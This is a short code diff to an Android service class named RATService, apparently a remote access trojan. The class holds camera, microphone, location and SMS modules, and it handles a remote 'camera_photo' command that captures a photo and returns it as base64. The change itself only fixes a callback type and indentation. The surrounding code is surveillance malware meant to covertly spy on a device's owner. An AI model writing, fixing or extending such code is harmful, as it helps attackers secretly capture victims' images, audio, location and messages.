@@ -81,7 +81,9 @@ public class RATService extends Service {
     private boolean isLocationTracking = false;
     
     // Modules
-  private Camera2Module cameraModule;
+    private Camera2Module cameraModule;
+    //private CameraModule cameraModule;
+
     private MicModule micModule;
     private LocationModule locationModule;
     private SmsModule smsModule;
@@ -560,7 +562,7 @@ case "camera_photo":
     if (cameraModule != null) {
         Log.d(TAG, "📸 Taking photo with camera module");
         
-        cameraModule.takePhoto(new CameraModule.CameraCallback() {
+        cameraModule.takePhoto(new Camera2Module.CameraCallback() {  // Changed from CameraModule.CameraCallback
             @Override
             public void onPhotoTaken(String base64Image) {
                 Log.d(TAG, "📸 Photo taken successfully, sending response");
